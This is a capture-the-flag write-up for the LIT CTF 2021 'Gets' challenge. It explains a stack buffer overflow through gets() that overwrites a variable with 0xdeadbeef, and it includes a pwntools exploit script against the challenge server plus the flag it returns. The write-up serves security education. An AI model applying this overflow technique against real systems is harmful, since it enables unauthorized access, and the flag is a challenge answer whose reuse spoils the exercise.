# Lexington Informatics Tournament CTF 2021

## pwn/Gets

> Rythm 
> 
> My favorite libc function is gets. I am very confident in its security.
> 
> `nc gets.litctf.live 1337`
>
> [gets_pwn.zip](gets_pwn.zip)


Tags: _pwn_ _x86-64_ _variable-ovewrite_ _bof_


## Summary

Basic BoF/variable overwrite to get the flag.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

With PIE enabled and no leak, getting a shell may not be possible, however it's not necessary for this simple challenge.


### Decompile with Ghidra (never trust the source they give you, source can lie)

```c
undefined8 main(void)
{
  int iVar1;
  char local_38 [32];
  FILE *local_18;
  long local_10;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  // many puts calls removed for brevity 
  local_10 = 0;
  gets(local_38);
  iVar1 = strcmp(local_38,"Yes");
  if (iVar1 == 0) {
    puts("I\'m glad you understand.");
    if (local_10 == 0xdeadbeef) {
      local_18 = fopen("flag.txt","r");
      if (local_18 == (FILE *)0x0) {
        puts("Something is wrong. Please contact Rythm.");
        exit(1);
      }
      fgets(local_38,0x20,local_18);
      puts("Debug info:");
      puts(local_38);
    }
  }
  else {
    puts("Think Mark, think! Gets is secure!");
  }
  return 0;
}
```

`gets` is the vulnerability.

To get the flag, `local_38` must equal `Yes\0` (the null is required to terminate the string), and `local_10` must equal `0xdeadbeef`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

p = remote('gets.lit-ctf-2021-3-codelab.kctf.cloud', 1337)

payload  = b''
payload += b'Yes\0'
payload += (0x38 - 0x10 - len(payload)) * b'A'
payload += p32(0xdeadbeef)

p.sendlineafter('?\n',payload)
p.stream()
```

Ghidra makes the maths easy for you.  `local_38` is `0x38` bytes from the return address and `local_10` is `0x10` bytes from the return address, so to write to `local_10`, if overflowing `local_38`, write out `0x38 - 0x10` bytes.


Output:

```bash
# ./exploit.py
[+] Opening connection to gets.lit-ctf-2021-3-codelab.kctf.cloud on port 1337: Done
I'm glad you understand.
Debug info:
flag{d0_y0u_g3ts_1t}
```
